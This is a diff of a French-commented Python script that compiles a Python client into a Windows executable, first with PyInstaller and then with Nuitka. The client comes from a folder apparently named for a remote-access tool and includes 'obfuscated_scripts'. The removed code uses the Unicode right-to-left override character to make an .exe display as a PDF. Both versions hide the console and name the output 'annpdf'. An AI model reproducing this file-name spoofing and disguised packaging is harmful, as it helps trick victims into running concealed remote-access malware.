@@ -1,52 +1,71 @@
 import subprocess
 import sys
 import os
+import shutil
 
-# Fonction pour générer un fichier .exe à partir d'un script Python
-def create_exe(input_file, exe_name=None, icon_path=None):
+def create_exe_with_nuitka(input_file: str, exe_name: str = None):
+    """
+    Génère un fichier .exe à partir d'un script Python en utilisant Nuitka.
+
+    :param input_file: Chemin vers le fichier Python source.
+    :param exe_name: Nom de l'exécutable généré (facultatif).
+    """
     try:
-        # Vérifiez si PyInstaller est installé, sinon installez-le
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+        # Vérification des prérequis
+        if not os.path.isfile(input_file):
+            raise FileNotFoundError(f"Le fichier spécifié '{input_file}' n'existe pas.")
 
-        # Appliquer le caractère Unicode RLO pour inverser l'affichage du nom
-        if exe_name:
-            rlo = "\u202E"  # Caractère RLO pour inverser visuellement l'écriture
-            exe_name = f"ann{rlo}pdf.exe"
-
-        # Commande PyInstaller pour créer l'exécutable
+        # Commande Nuitka pour la création de l'exécutable
         command = [
             sys.executable,
-            "-m", "PyInstaller",
-            "--onefile",   # Crée un fichier exécutable unique
-            "--noconsole"  # Supprime la fenêtre de console si c'est une application GUI
+            "-m", "nuitka",
+            "--standalone",              # Crée un exécutable autonome
+            "--onefile",                 # Génère un seul fichier exécutable
+            "--mingw64",                 # Utilise le compilateur MinGW64
+            "--nofollow-import-to=*",    # Ignore les imports inutilisés
+            "--windows-disable-console"  # Supprime la console pour les applications GUI
         ]
 
-        # Ajoutez l'option --name si un nom personnalisé est fourni
-        if exe_name:
-            command.extend(["--name", exe_name])
-
-        # Ajoutez l'option pour définir l'icône
-        if icon_path and os.path.exists(icon_path):
-            command.extend(["--icon", icon_path])
-
-        # Ajoutez le fichier d'entrée
+        # Ajouter le fichier d'entrée
         command.append(input_file)
 
-        # Exécuter la commande PyInstaller
-        subprocess.check_call(command)
+        # Afficher la commande exécutée (utile pour le débogage)
+        print(f"Exécution de la commande : {' '.join(command)}")
 
-        print(f"L'exécutable '{exe_name}' a été généré avec succès avec l'icône {icon_path} !")
+        # Exécuter la commande Nuitka
+        result = subprocess.run(command, text=True, capture_output=True)
 
-    except subprocess.CalledProcessError as e:
-        print(f"Une erreur est survenue lors de l'exécution de PyInstaller: {e}")
+        # Vérifier le statut de retour
+        if result.returncode == 0:
+            print("Compilation réussie.")
+
+            # Renommer le fichier généré si exe_name est fourni
+            if exe_name:
+                output_dir = os.path.join(os.getcwd(), input_file.replace(".py", ".exe"))
+                if os.path.isfile(output_dir):
+                    shutil.move(output_dir, exe_name)
+                    print(f"Fichier renommé en : {exe_name}")
+                else:
+                    print("Fichier généré introuvable pour renommer.")
+            else:
+                print("Aucun renommage spécifié.")
+        else:
+            print(f"Erreur lors de l'exécution de Nuitka : {result.stderr}")
+            print(f"Sortie standard : {result.stdout}")
+
+    except FileNotFoundError as e:
+        print(f"Erreur : {e}")
+    except subprocess.SubprocessError as e:
+        print(f"Erreur liée au sous-processus : {e}")
     except Exception as e:
-        print(f"Une erreur inattendue est survenue: {e}")
+        print(f"Une erreur inattendue est survenue : {e}")
 
 
-# Exemple d'utilisation
 if __name__ == "__main__":
-    # Chemin vers le fichier Python que tu souhaites transformer en .exe
-    input_file = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\obfuscated_scripts\\client.py"  # Remplace par ton fichier .py
-    exe_name = "annpdf"  # Nom réel du fichier
-    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\win.ico"  # Remplace par le chemin de ton icône au format .ico
-    create_exe(input_file, exe_name, icon_path)
+    # Exemple d'utilisation
+    # Chemin du fichier Python à transformer en exécutable
+    input_file = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\client.py"  # Modifiez ce chemin selon vos besoins
+    exe_name = "annpdf.exe"  # Nom de l'exécutable (facultatif)
+    
+    # Appel de la fonction pour créer l'exécutable
+    create_exe_with_nuitka(input_file, exe_name)
